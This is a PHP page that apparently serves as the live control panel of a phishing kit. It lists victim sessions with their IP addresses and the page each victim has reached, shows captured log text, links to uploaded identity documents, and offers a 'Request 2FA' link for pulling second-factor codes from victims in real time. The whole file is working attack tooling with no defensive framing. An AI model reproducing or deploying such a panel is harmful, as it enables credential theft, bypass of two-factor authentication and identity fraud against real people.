<?php
  function getFileList($dir)
  {
    // array to hold return value
    $retval = [];

    // add trailing slash if missing
    if(substr($dir, -1) != "/") {
      $dir .= "/";
    }

    // open pointer to directory and read list of files
    $d = @dir($dir) or die("getFileList: Failed opening directory {$dir} for reading");
    while(FALSE !== ($entry = $d->read())) {
      // skip hidden files
      if($entry{0} == ".") continue;
      if(is_dir("{$dir}{$entry}")) {
        $retval[] = [
          'name' => "{$dir}{$entry}/",
          'type' => filetype("{$dir}{$entry}"),
          'size' => 0,
          'lastmod' => filemtime("{$dir}{$entry}")
        ];
      } elseif(is_readable("{$dir}{$entry}")) {
        $retval[] = [
          'name' => "{$dir}{$entry}",
          'type' => mime_content_type("{$dir}{$entry}"),
          'size' => filesize("{$dir}{$entry}"),
          'lastmod' => filemtime("{$dir}{$entry}")
        ];
      }
    }
    $d->close();

    return $retval;
  }

  $dirlist = getFileList("./sessions/");
?>

<style>
table, th, td {
  border: 1px solid black;
}
table {
  width: 100%;
  border-collapse: collapse;
}

</style>
<html>
  <head>
    <meta http-equiv="refresh" content="5">
  </head>
  <body>

<table>
  <tr>
    <th>Session ID</th>
    <th>IP</th>
    <th>Current Step</th>
    <th>Log File</th>
    <th>Doc Upload</th>
    <th>Fetch 2FA</th>
  </tr>
  <?php
    foreach ($dirlist as &$value) {
      $read = json_decode(file_get_contents($value["name"]));
      echo("
      <td>".$read->sessionID."</td>
      <td>".$read->ip."</td>
      <td>".$read->currentPage."</td>
      ");
      if (file_exists("logs/".$read->sessionID.".txt")) {
        $log = file_get_contents("logs/".$read->sessionID.".txt");
        echo("<td><pre>$log</pre></td>");
      }
      else {
        echo("<td>Waiting...</td>");
      }
      if (file_exists("logs/".$read->sessionID.".png")) {
        echo("<td><a href='logs/".$read->sessionID.".png'>Link</a></td>");
      }
      else {
        if (file_exists("logs/".$read->sessionID.".jpg")) {
          echo("<td><a href='logs/".$read->sessionID.".jpg'>Link</a></td>");
        }
        else {
          if (file_exists("logs/".$read->sessionID.".jpeg")) {
            echo("<td><a href='logs/".$read->sessionID.".jpeg'>Link</a></td>");
          }
          else {
            if (file_exists("logs/".$read->sessionID.".pdf")) {
              echo("<td><a href='logs/".$read->sessionID.".pdf'>Link</a></td>");
            }
            else {
              echo("<td>Waiting...</td>");
            }
          }
        }
      }
      echo("<td><a href='log.php?t=3&session=".$read->sessionID."' target='_blank'>Request 2FA</a></td>");
    }
  ?>
</table>
  </body>
</html>